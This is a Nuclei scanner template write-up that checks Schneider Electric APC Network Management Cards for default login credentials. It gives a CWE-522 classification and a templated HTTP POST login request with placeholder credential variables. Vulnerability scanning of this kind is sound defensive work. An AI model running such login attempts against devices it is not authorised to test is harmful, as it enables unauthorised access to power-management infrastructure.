# Nuclei Template: Schneider Electric APC NMC - Default Login
**Template ID:** apc-nmc-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`apc-nmc-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Schneider Electric APC Network Management Cards with default credentials.

## Steps to reproduce / Exploit Payload
```http
POST /Forms/login1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

login_username={{username}}&login_password={{password}}&prefLanguage=00000000&submit=Log+On
```

## References
- https://www.apc.com/us/en/faqs/FA156047/
